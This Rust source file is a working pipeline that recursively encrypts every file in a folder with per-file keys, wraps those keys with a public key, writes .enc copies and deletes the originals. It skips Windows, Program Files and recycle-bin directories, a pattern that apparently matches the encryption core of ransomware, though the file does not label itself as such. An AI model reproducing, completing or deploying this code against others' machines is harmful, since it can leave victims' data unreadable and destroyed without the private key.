// parallel encryption pipeline

use std::collections::{BTreeMap, HashMap};
use std::future::Future;
use std::path::{Path, PathBuf};
use std::pin::Pin;
use std::sync::Arc;

use anyhow::Result;
use sodiumoxide::crypto::aead::xchacha20poly1305_ietf as aead;
use sodiumoxide::crypto::box_::PublicKey;
use tokio::fs::File;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::sync::{Mutex, mpsc};
use uuid::Uuid;

use crate::cryptography::chunk::{
    CHANNEL_BOUND, CHUNK_SIZE, ChunkInfo, EncryptedChunk, FileHeader, FileTask, ReadMessage,
    SMALL_FILE_THRESHOLD,
};
use crate::cryptography::keys::{encrypt_key, generate_sym_key};
use crate::debug_log;

// helper to format UUID as short 8-character string for logs
fn short_uuid(uuid: &Uuid) -> String {
    uuid.to_string()[..8].to_string()
}

// 4 main "parts": recursive file discovery, file reader, encryption worker, file writer.

// ================= FILE DISCOVERY ==================
// basically just recursive traversal, but for each file
// a file encryption task is created (see below)

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum FileSearchMode {
    ForEncryption, // find regular files, skip .enc
    ForDecryption, // find .enc files only
}

// discovers files recursively based on mode
pub async fn discover_files(folder_path: &Path, mode: FileSearchMode) -> Result<Vec<FileTask>> {
    let mut tasks = Vec::new();
    discover_files_recursive(folder_path, folder_path, mode, &mut tasks).await?;
    Ok(tasks)
}

// for each file found, create a FileTask
fn discover_files_recursive<'a>(
    root: &'a Path,
    current: &'a Path,
    mode: FileSearchMode,
    tasks: &'a mut Vec<FileTask>,
) -> Pin<Box<dyn Future<Output = Result<()>> + 'a>> {
    Box::pin(async move {
        if current.is_file() {
            // Skip Windows system files
            if let Some(filename) = current.file_name() {
                let filename_str = filename.to_string_lossy().to_lowercase();
                if filename_str == "desktop.ini"
                    || filename_str == "thumbs.db"
                    || filename_str == ".ds_store"  // macOS
                    || filename_str.starts_with("~$")
                // Office temp files
                {
                    debug_log!("discovery: skipping system file {:?}", current);
                    return Ok(());
                }
            }

            let is_enc = current.extension().map_or(false, |e| e == "enc");

            let should_consider = match mode {
                FileSearchMode::ForEncryption => !is_enc,
                FileSearchMode::ForDecryption => is_enc,
            };

            if should_consider {
                let metadata = tokio::fs::metadata(current).await?;
                let size = metadata.len();

                let output_path = match mode {
                    FileSearchMode::ForEncryption => {
                        PathBuf::from(format!("{}.enc", current.to_string_lossy()))
                    }
                    FileSearchMode::ForDecryption => {
                        // output determined by header, use placeholder
                        current.with_extension("")
                    }
                };

                let should_chunk = size > SMALL_FILE_THRESHOLD;
                let file_id = Uuid::new_v4();

                debug_log!(
                    "discovery [{}]: found {:?} ({} bytes, chunked={})",
                    short_uuid(&file_id),
                    current,
                    size,
                    should_chunk
                );

                tasks.push(FileTask {
                    file_id,
                    original_path: current.to_path_buf(),
                    output_path,
                    size,
                    should_chunk,
                });
            }
        } else if current.is_dir() {
            // Skip system directories
            if let Some(dirname) = current.file_name() {
                let dirname_str = dirname.to_string_lossy().to_lowercase();
                if dirname_str == "$recycle.bin"
                    || dirname_str == "system volume information"
                    || dirname_str == "windows"
                    || dirname_str == "program files"
                    || dirname_str == "program files (x86)"
                {
                    debug_log!("discovery: skipping system directory {:?}", current);
                    return Ok(());
                }
            }

            let mut entries = tokio::fs::read_dir(current).await?;
            while let Some(entry) = entries.next_entry().await? {
                discover_files_recursive(root, &entry.path(), mode, tasks).await?;
            }
        }

        Ok(())
    })
}

// ================== FILE READER ==================
// code for file reading workers.

// reads a file and sends chunks to encryption pipeline
pub async fn worker_read(task: FileTask, tx: mpsc::Sender<ReadMessage>) -> Result<()> {
    let file_uuid = short_uuid(&task.file_id);

    debug_log!(
        "reader [{}]: opening {:?} ({} bytes)",
        file_uuid,
        task.original_path,
        task.size
    );

    let mut file = File::open(&task.original_path).await?;

    if !task.should_chunk {
        // small file - single chunk
        let mut data = Vec::with_capacity(task.size as usize);
        file.read_to_end(&mut data).await?;

        debug_log!(
            "reader [{}]: read chunk 0 ({} bytes, is_last=true)",
            file_uuid,
            data.len()
        );

        tx.send(ReadMessage::Chunk {
            file_id: task.file_id,
            sequence: 0,
            data,
            is_last: true,
        })
        .await
        .map_err(|_| anyhow::anyhow!("channel closed"))?;
    } else {
        // large file - chunk it
        let mut sequence = 0u32;
        let mut buffer = vec![0u8; CHUNK_SIZE];

        loop {
            let bytes_read = read_full(&mut file, &mut buffer).await?;
            if bytes_read == 0 {
                break;
            }

            let is_last = bytes_read < CHUNK_SIZE;
            let chunk_data = buffer[..bytes_read].to_vec();

            debug_log!(
                "reader [{}]: read chunk {} ({} bytes, is_last={})",
                file_uuid,
                sequence,
                bytes_read,
                is_last
            );

            tx.send(ReadMessage::Chunk {
                file_id: task.file_id,
                sequence,
                data: chunk_data,
                is_last,
            })
            .await
            .map_err(|_| anyhow::anyhow!("channel closed"))?;

            sequence += 1;
            if is_last {
                break;
            }
        }
    }

    tx.send(ReadMessage::FileComplete {
        file_id: task.file_id,
        original_path: task.original_path.clone(),
    })
    .await
    .map_err(|_| anyhow::anyhow!("channel closed"))?;

    debug_log!("reader [{}]: completed {:?}", file_uuid, task.original_path);
    Ok(())
}

// reads as much of the file as possible into a buffer
async fn read_full(file: &mut File, buffer: &mut [u8]) -> Result<usize> {
    let mut total = 0;
    while total < buffer.len() {
        let n = file.read(&mut buffer[total..]).await?;
        if n == 0 {
            break;
        }
        total += n;
    }
    Ok(total)
}

// spawns readers for all files, stops on first error
pub fn spawn_workers_read(
    tasks: Vec<FileTask>,
    tx: mpsc::Sender<ReadMessage>,
) -> tokio::task::JoinHandle<Result<()>> {
    tokio::spawn(async move {
        debug_log!("readers: starting {} tasks", tasks.len());

        for task in tasks {
            let tx_clone = tx.clone();
            let path = task.original_path.clone();

            if let Err(e) = worker_read(task, tx_clone).await {
                return Err(anyhow::anyhow!("failed reading {:?}: {}", path, e));
            }
        }

        debug_log!("readers: all done");
        drop(tx);
        Ok(())
    })
}

// ================== ENCRYPTION WORKER ==================

// per-file encryption state
pub struct FileEncryptionContext {
    pub sym_key: aead::Key,
    pub encrypted_sym_key: Vec<u8>,
    pub chunks_processed: u32,
}

// encrypts chunks from rx, sends to tx
pub async fn worker_encrypt(
    id: usize,
    mut rx: mpsc::Receiver<ReadMessage>,
    tx: mpsc::Sender<EncryptedChunk>,
    pk: PublicKey,
    contexts: Arc<Mutex<HashMap<Uuid, FileEncryptionContext>>>,
) -> Result<()> {
    debug_log!("encrypt_worker[{}]: started", id);

    while let Some(msg) = rx.recv().await {
        match msg {
            ReadMessage::Chunk {
                file_id,
                sequence,
                data,
                is_last,
            } => {
                let file_uuid = short_uuid(&file_id);
                let input_size = data.len();

                let sym_key = {
                    let mut ctx = contexts.lock().await;
                    let entry = ctx.entry(file_id).or_insert_with(|| {
                        debug_log!(
                            "encrypt_worker[{}] [{}]: created encryption context",
                            id,
                            file_uuid
                        );
                        let (key, _) = generate_sym_key().expect("keygen failed");
                        let enc_key = encrypt_key(&pk, key.clone()).expect("key encrypt failed");
                        FileEncryptionContext {
                            sym_key: key,
                            encrypted_sym_key: enc_key,
                            chunks_processed: 0,
                        }
                    });
                    entry.chunks_processed += 1;
                    entry.sym_key.clone()
                };

                let nonce = aead::gen_nonce();
                let nonce_bytes: [u8; 24] =
                    nonce.as_ref().try_into().expect("nonce must be 24 bytes");

                let key_clone = sym_key;
                let nonce_clone = nonce;
                let encrypted = tokio::task::spawn_blocking(move || {
                    aead::seal(&data, None, &nonce_clone, &key_clone)
                })
                .await?;

                debug_log!(
                    "encrypt_worker[{}] [{}]: encrypted chunk {} ({} -> {} bytes)",
                    id,
                    file_uuid,
                    sequence,
                    input_size,
                    encrypted.len()
                );

                tx.send(EncryptedChunk {
                    file_id,
                    sequence,
                    data: encrypted,
                    nonce: nonce_bytes,
                    is_last,
                })
                .await
                .map_err(|_| anyhow::anyhow!("channel closed"))?;
            }
            ReadMessage::FileComplete { .. } => {
                // ignored - writer uses is_last flag
            }
        }
    }

    debug_log!("encrypt_worker[{}]: shutdown", id);
    Ok(())
}

// spawns encryption workers with round-robin dispatcher
pub fn spawn_workers_encrypt(
    num_workers: usize,
    mut rx: mpsc::Receiver<ReadMessage>,
    tx: mpsc::Sender<EncryptedChunk>,
    pk: PublicKey,
    contexts: Arc<Mutex<HashMap<Uuid, FileEncryptionContext>>>,
) -> tokio::task::JoinHandle<Result<()>> {
    debug_log!("encrypt dispatcher: spawning {} workers", num_workers);

    tokio::spawn(async move {
        let (worker_txs, worker_rxs): (Vec<_>, Vec<_>) = (0..num_workers)
            .map(|_| mpsc::channel::<ReadMessage>(CHANNEL_BOUND))
            .unzip();

        let mut handles = Vec::new();
        for (i, worker_rx) in worker_rxs.into_iter().enumerate() {
            let tx_clone = tx.clone();
            let pk_clone = pk.clone();
            let ctx_clone = contexts.clone();
            handles.push(tokio::spawn(async move {
                worker_encrypt(i, worker_rx, tx_clone, pk_clone, ctx_clone).await
            }));
        }
        drop(tx);

        // round-robin dispatch
        let mut next = 0;
        while let Some(msg) = rx.recv().await {
            match &msg {
                ReadMessage::FileComplete { .. } => {
                    for wtx in &worker_txs {
                        let _ = wtx.send(msg.clone()).await;
                    }
                }
                ReadMessage::Chunk { .. } => {
                    if worker_txs[next].send(msg).await.is_err() {
                        return Err(anyhow::anyhow!("worker {} channel closed", next));
                    }
                    next = (next + 1) % num_workers;
                }
            }
        }

        drop(worker_txs);

        // collect results
        let mut first_err = None;
        for (i, h) in handles.into_iter().enumerate() {
            match h.await {
                Ok(Ok(())) => {}
                Ok(Err(e)) => {
                    if first_err.is_none() {
                        first_err = Some(anyhow::anyhow!(
                            "encrypt_worker[{}]: failed with error: {}",
                            i,
                            e
                        ));
                    }
                }
                Err(e) => {
                    if first_err.is_none() {
                        first_err = Some(anyhow::anyhow!("encrypt_worker[{}]: PANICKED: {}", i, e));
                    }
                }
            }
        }

        if let Some(e) = first_err {
            return Err(e);
        }
        Ok(())
    })
}

// ================== FILE WRITER ==================
// tracks state for a file being written
pub struct FileWriteState {
    pub file_id: Uuid,
    pub output_path: PathBuf,
    pub original_path: PathBuf,
    pub relative_name: String,
    pub original_size: u64,
    pub encrypted_sym_key: Vec<u8>,
    pub chunks: BTreeMap<u32, EncryptedChunk>,
    pub total_chunks: Option<u32>,
}

impl FileWriteState {
    pub fn new(
        file_id: Uuid,
        output_path: PathBuf,
        original_path: PathBuf,
        relative_name: String,
        original_size: u64,
        encrypted_sym_key: Vec<u8>,
    ) -> Self {
        Self {
            file_id,
            output_path,
            original_path,
            relative_name,
            original_size,
            encrypted_sym_key,
            chunks: BTreeMap::new(),
            total_chunks: None,
        }
    }

    pub fn add_chunk(&mut self, chunk: EncryptedChunk) {
        if chunk.is_last {
            self.total_chunks = Some(chunk.sequence + 1);
        }
        self.chunks.insert(chunk.sequence, chunk);
    }

    pub fn is_complete(&self) -> bool {
        match self.total_chunks {
            Some(total) => {
                if self.chunks.len() as u32 != total {
                    return false;
                }
                for (i, (seq, _)) in self.chunks.iter().enumerate() {
                    if *seq != i as u32 {
                        return false;
                    }
                }
                true
            }
            None => false,
        }
    }

    // writes header + chunks to output file
    pub async fn finalize(&self) -> Result<()> {
        let file_uuid = short_uuid(&self.file_id);

        debug_log!(
            "writer [{}]: finalizing {:?} -> {:?}",
            file_uuid,
            self.original_path,
            self.output_path
        );

        let chunk_infos: Vec<ChunkInfo> = self
            .chunks
            .iter()
            .map(|(seq, c)| ChunkInfo {
                sequence: *seq,
                encrypted_size: c.data.len(),
                nonce: c.nonce,
            })
            .collect();

        let header = FileHeader {
            original_filename: self.relative_name.clone(),
            original_size: self.original_size,
            chunk_count: self.chunks.len() as u32,
            chunks: chunk_infos,
            encrypted_sym_key: self.encrypted_sym_key.clone(),
        };

        let header_bytes = header.to_bytes().map_err(|e| {
            debug_log!(
                "writer [{}]: ERROR serializing header for {:?}: {}",
                file_uuid,
                self.original_path,
                e
            );
            e
        })?;

        debug_log!(
            "writer [{}]: header {} bytes, {} chunks",
            file_uuid,
            header_bytes.len(),
            self.chunks.len()
        );

        let mut file = File::create(&self.output_path).await.map_err(|e| {
            debug_log!(
                "writer [{}]: ERROR creating {:?}: {}",
                file_uuid,
                self.output_path,
                e
            );
            e
        })?;

        file.write_all(&header_bytes).await.map_err(|e| {
            debug_log!(
                "writer [{}]: ERROR writing header to {:?}: {}",
                file_uuid,
                self.output_path,
                e
            );
            e
        })?;

        for (seq, chunk) in &self.chunks {
            debug_log!(
                "writer [{}]: writing chunk {} ({} bytes)",
                file_uuid,
                seq,
                chunk.data.len()
            );

            file.write_all(&chunk.data).await.map_err(|e| {
                debug_log!(
                    "writer [{}]: ERROR writing chunk {} to {:?}: {}",
                    file_uuid,
                    seq,
                    self.output_path,
                    e
                );
                e
            })?;
        }

        file.flush().await.map_err(|e| {
            debug_log!(
                "writer [{}]: ERROR flushing {:?}: {}",
                file_uuid,
                self.output_path,
                e
            );
            e
        })?;

        debug_log!("writer [{}]: flushed, deleting original", file_uuid);

        // delete original only after successful write
        tokio::fs::remove_file(&self.original_path)
            .await
            .map_err(|e| {
                debug_log!(
                    "writer [{}]: ERROR deleting original {:?}: {}",
                    file_uuid,
                    self.original_path,
                    e
                );
                e
            })?;

        debug_log!(
            "writer [{}]: completed {:?} successfully",
            file_uuid,
            self.original_path
        );
        Ok(())
    }
}

// file metadata: (output_path, original_path, relative_name, size)
pub type FileMetadata = HashMap<Uuid, (PathBuf, PathBuf, String, u64)>;

// writes encrypted chunks to files
pub async fn worker_write(
    mut rx: mpsc::Receiver<EncryptedChunk>,
    metadata: Arc<Mutex<FileMetadata>>,
    contexts: Arc<Mutex<HashMap<Uuid, FileEncryptionContext>>>,
) -> Result<()> {
    debug_log!("writer: started");

    let mut states: HashMap<Uuid, FileWriteState> = HashMap::new();
    let mut files_processed = 0;

    while let Some(chunk) = rx.recv().await {
        let file_id = chunk.file_id;
        let file_uuid = short_uuid(&file_id);

        // create state if needed
        if !states.contains_key(&file_id) {
            let meta = metadata.lock().await;
            let (output, original, relative, size) = meta
                .get(&file_id)
                .ok_or_else(|| {
                    debug_log!("writer [{}]: ERROR no metadata found", file_uuid);
                    anyhow::anyhow!("no metadata for file [{}]", file_uuid)
                })?
                .clone();

            let ctx = contexts.lock().await;
            let enc_key = ctx
                .get(&file_id)
                .ok_or_else(|| {
                    debug_log!("writer [{}]: ERROR no encryption context found", file_uuid);
                    anyhow::anyhow!("no context for file [{}]", file_uuid)
                })?
                .encrypted_sym_key
                .clone();

            debug_log!("writer [{}]: created state for {:?}", file_uuid, original);

            states.insert(
                file_id,
                FileWriteState::new(file_id, output, original, relative, size, enc_key),
            );
        }

        let state = states.get_mut(&file_id).unwrap();

        debug_log!(
            "writer [{}]: received chunk {} (is_last={})",
            file_uuid,
            chunk.sequence,
            chunk.is_last
        );

        state.add_chunk(chunk);

        if state.is_complete() {
            debug_log!(
                "writer [{}]: file complete, {} chunks received",
                file_uuid,
                state.chunks.len()
            );

            state.finalize().await?;
            states.remove(&file_id);
            files_processed += 1;

            let mut ctx = contexts.lock().await;
            ctx.remove(&file_id);
        }
    }

    // check for incomplete files
    if !states.is_empty() {
        let incomplete: Vec<_> = states.keys().map(|id| short_uuid(id)).collect();
        debug_log!(
            "writer: ERROR - {} incomplete files: {:?}",
            incomplete.len(),
            incomplete
        );
        return Err(anyhow::anyhow!("incomplete files: {:?}", incomplete));
    }

    debug_log!("writer: shutdown, processed {} files", files_processed);
    Ok(())
}

pub fn spawn_workers_write(
    rx: mpsc::Receiver<EncryptedChunk>,
    metadata: Arc<Mutex<FileMetadata>>,
    contexts: Arc<Mutex<HashMap<Uuid, FileEncryptionContext>>>,
) -> tokio::task::JoinHandle<Result<()>> {
    tokio::spawn(async move { worker_write(rx, metadata, contexts).await })
}

// ================== ENCRYPTION ENTRYPOINT ==================

pub async fn encrypt_folder_parallel(
    folder_path: &Path,
    pk: &PublicKey,
    num_workers: Option<usize>,
) -> Result<()> {
    if !folder_path.exists() || !folder_path.is_dir() {
        return Err(anyhow::anyhow!("invalid folder path"));
    }

    let num_workers = num_workers.unwrap_or_else(|| num_cpus::get().saturating_sub(1).max(1));

    debug_log!(
        "orchestrator: encrypting {:?} with {} workers",
        folder_path,
        num_workers
    );

    // discover files
    let tasks = discover_files(folder_path, FileSearchMode::ForEncryption).await?;
    if tasks.is_empty() {
        debug_log!("orchestrator: no files to encrypt");
        return Ok(());
    }

    debug_log!("orchestrator: found {} files", tasks.len());

    // calculate total size
    let total_bytes: u64 = tasks.iter().map(|t| t.size).sum();
    debug_log!(
        "orchestrator: discovered {} files, total {} bytes",
        tasks.len(),
        total_bytes
    );

    // shared state
    let metadata: Arc<Mutex<FileMetadata>> = Arc::new(Mutex::new(HashMap::new()));
    let contexts: Arc<Mutex<HashMap<Uuid, FileEncryptionContext>>> =
        Arc::new(Mutex::new(HashMap::new()));

    // populate metadata
    {
        let mut m = metadata.lock().await;
        for t in &tasks {
            let relative = t
                .original_path
                .strip_prefix(folder_path)
                .unwrap_or(&t.original_path)
                .to_string_lossy()
                .to_string();
            m.insert(
                t.file_id,
                (
                    t.output_path.clone(),
                    t.original_path.clone(),
                    relative,
                    t.size,
                ),
            );
        }
    }

    // channels
    let (read_tx, read_rx) = mpsc::channel(CHANNEL_BOUND * num_workers);
    let (encrypt_tx, encrypt_rx) = mpsc::channel(CHANNEL_BOUND * num_workers);

    // spawn pipeline
    let reader_handle = spawn_workers_read(tasks, read_tx);
    let encrypt_handle = spawn_workers_encrypt(
        num_workers,
        read_rx,
        encrypt_tx,
        pk.clone(),
        contexts.clone(),
    );
    let writer_handle = spawn_workers_write(encrypt_rx, metadata.clone(), contexts.clone());

    // wait for completion
    reader_handle.await??;
    debug_log!("orchestrator: readers done");

    encrypt_handle.await??;
    debug_log!("orchestrator: encrypters done");

    writer_handle.await??;
    debug_log!("orchestrator: writer done");

    debug_log!("encryption completed for {:?}", folder_path);
    Ok(())
}
